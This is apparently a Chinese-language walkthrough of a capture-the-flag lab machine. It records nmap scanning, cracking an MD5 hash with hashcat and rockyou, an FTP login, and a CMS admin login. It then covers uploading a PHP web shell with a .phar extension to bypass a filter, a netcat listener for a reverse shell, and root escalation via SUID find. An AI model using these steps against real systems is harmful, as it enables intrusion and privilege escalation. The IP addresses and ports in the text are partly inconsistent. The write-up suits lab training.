# 服务扫描

## 使用 nmap 进行基础扫描

扫描所执行的命令，执行结果如下

```
sudo nmap -sn 10.10.10.0/24

sudo nmap --min-rate 10000 -p- 10.10.10.31   

sudo nmap -sC -sT -sV -p22,80 10.10.10.31 

sudo nmap --script=vuln -p22,80 10.10.10.31 
```

![[Pasted image 20250524173935.png]]

21 端口开放了 ftp 服务，在找到账号密码后可进行 登入 ，
靶机还开放了 smb 服务，可进行更详细的 smb 扫描，

查看 80 端口，是 Ubuntu 的默认界面

![[Pasted image 20250524174155.png]]

查看源代码发现串 md5

![[Pasted image 20250524174246.png]]

![[Pasted image 20250524174321.png]]

使用 hashcat 破解

```
sudo hashcat -m 0 -a 0 Hash/md5.txt /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250524174820.png]]

![[Pasted image 20250524174921.png]]

使用该字符串尝试进行 ftp 登入，因为没有密码，使用账号密码都使用 hostinger

```
ftp 10.10.10.6
```

![[Pasted image 20250524175222.png]]

binary 进入 二进制 模式

```
binary
```

获取文件

```
ls -liah

cd files

get hint.txt

exit
```

![[Pasted image 20250524175401.png]]

查看下载下来的 txt 文件

![[Pasted image 20250524175511.png]]

你需要跟随 'hostinger' 两个 base64 编码解密如下

![[Pasted image 20250524181324.png]]

![[Pasted image 20250524181345.png]]

进入给定的链接，将参数给上

![[Pasted image 20250524181711.png]]

根据提示访问 venom.box

![[Pasted image 20250524181547.png]]

登入 dora

![[Pasted image 20250524181752.png]]

点击齿轮，进入后台

![[Pasted image 20250524181839.png]]

找到文件上传页面，上传一个 php 漏洞

![[Pasted image 20250524181912.png]]

php 被过滤了，尝试不常见的 php 后缀，发现 phar 没被过滤

# Linux 提权

kali 建立 监听

```
sudo nc -lvnp 4444
```

![[Pasted image 20250524182056.png]]
![[Pasted image 20250524182132.png]]

查看 passwd ，寻找 拥有 bash 环境 的用户

![[Pasted image 20250524182255.png]]

切换成 hostinger 用户

```
su hostinger
```

在 /var/www/html/subrion/backup 下发现了一个密码

![[Pasted image 20250524182706.png]]

尝试切换为 nathan 用户

查看具有 s 位 的可执行文件

```
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20250524182847.png]]

使用 find 提权

```
sudo install -m =xs $(which find) .

./find . -exec /bin/bash -p \; -quit
```

![[Pasted image 20250524183056.png]]